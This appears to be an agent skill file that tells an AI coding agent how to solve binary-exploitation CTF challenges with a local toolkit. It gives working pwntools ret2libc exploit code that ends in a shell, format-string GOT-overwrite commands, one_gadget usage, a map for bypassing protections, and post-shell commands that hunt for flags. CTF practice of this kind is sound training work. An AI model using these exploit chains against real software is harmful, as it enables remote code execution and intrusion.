---
name: ctf-toolkit-pwn
description: Executes binary exploitation toolkit scripts for CTF challenges. Use when the challenge is a native binary or network service requiring memory corruption, ROP chains, format string bugs, or heap exploitation. Runs bof_helper.py, fmt_string.py, and pwn_template.py from ~/ctf-toolkit/pwn/.
license: MIT
compatibility: Requires ~/ctf-toolkit and pwntools. GDB + pwndbg recommended.
allowed-tools: Bash Read Write Edit Glob Grep Task
metadata:
  user-invocable: "true"
---

# CTF Toolkit — Binary Exploitation

Operational skill: run the scripts directly. Pivot to `/ctf-pwn` for deep technique notes.

## Step 1 — Triage the Binary

```bash
TOOLKIT=~/ctf-toolkit
BIN=./challenge   # set this

# Protections
python3 $TOOLKIT/pwn/bof_helper.py --binary $BIN --checksec

# Symbols and imports
python3 $TOOLKIT/rev/static_analysis.sh $BIN 2>/dev/null | head -60

# Quick strings
strings -n 8 $BIN | grep -iE "(flag|win|system|sh|exec|gets|scanf|printf|read)"

# Run it once to understand behavior
echo "hello" | ./$BIN
```

## Step 2 — Find the Vulnerability

```bash
# Detect format string
python3 $TOOLKIT/vuln-research/fuzzer.py --mode detect-fmt --binary $BIN

# Find buffer overflow offset
python3 $TOOLKIT/pwn/bof_helper.py --binary $BIN --cyclic 256
# → crash the binary with the pattern, note RIP/EIP value, then:
python3 $TOOLKIT/pwn/bof_helper.py --binary $BIN --find-offset 0x<crash_value>

# Find ROP gadgets
python3 $TOOLKIT/pwn/bof_helper.py --binary $BIN --gadgets
```

## Step 3 — Build the Exploit

Copy and edit the template:

```bash
cp $TOOLKIT/pwn/pwn_template.py ./solve.py
# Edit: BINARY, LIBC path, OFFSET, exploit() function
```

### Stack Overflow — ret2libc

```python
# In solve.py exploit():
OFFSET = 72   # from bof_helper --find-offset

# Stage 1: leak libc via puts(puts@got)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]
stage1  = flat({OFFSET: [ret.address, pop_rdi.address, elf.got['puts'], elf.plt['puts'], elf.symbols['main']]})
io.sendlineafter(b'> ', stage1)

# Stage 2: compute libc base and call system('/bin/sh')
leak = u64(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
binsh  = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
rop2   = ROP(libc)
stage2 = flat({OFFSET: [ret.address, pop_rdi.address, binsh, system]})
io.sendlineafter(b'> ', stage2)
io.interactive()
```

### ret2libc — use bof_helper skeleton

```bash
python3 $TOOLKIT/pwn/bof_helper.py --binary $BIN --ret2libc ./libc.so.6 --offset 72
# Prints ready-to-paste Stage 1 + Stage 2 template
```

### Format String

```bash
# Find offset interactively
python3 $TOOLKIT/pwn/fmt_string.py --binary $BIN --mode find-offset

# Leak stack to find libc/canary
python3 $TOOLKIT/pwn/fmt_string.py --binary $BIN --mode leak-stack --offset 6

# Overwrite GOT entry
python3 $TOOLKIT/pwn/fmt_string.py --binary $BIN --mode write-addr \
  --offset 6 --addr 0x601234 --value 0xdeadbeef
```

## Step 4 — Run the Exploit

```bash
# Local
python3 solve.py

# Remote
python3 solve.py --remote challenge.ctf.io 1337

# With GDB (set --debug in template)
python3 solve.py --debug
```

## Step 5 — Get the Flag

```bash
# Once shell is obtained:
cat /flag.txt
find / -name "flag*" 2>/dev/null
env | grep FLAG
```

## GDB Quick Commands

```bash
gdb $BIN
(gdb) info functions           # list functions — look for win/flag/check
(gdb) disas main               # disassemble main
(gdb) b *main+0x5a             # break at offset
(gdb) run <<< $(python3 -c "print('A'*100)")
(gdb) x/20wx $rsp              # stack dump
(gdb) x/i $pc                  # current instruction
(gdb) i r rip rsp rbp          # register values

# pwndbg extras
heap              # heap layout
bins              # free list state
checksec          # protections
rop               # auto ROP chain
```

## one_gadget (instant shell if conditions met)

```bash
one_gadget libc.so.6
# Returns addresses like 0xe3b2e — use as RIP overwrite target
```

## Decision Map

```
NX off + no PIE       → shellcode (write to stack/heap, jump there)
NX on  + no ASLR      → ret2libc with known addresses
NX on  + ASLR + leak  → leak libc → ret2libc stage 2
Canary present        → leak canary via format string, then overflow
Format string bug     → use fmt_string.py for GOT overwrite
Heap challenge        → tcache / fastbin dup, use pwndbg bins
```

## Pivot

- Deep technique notes: `/ctf-pwn`
- Static analysis first: `/ctf-toolkit-rev`
- Finding the bug via fuzzing: `/ctf-toolkit-vuln`
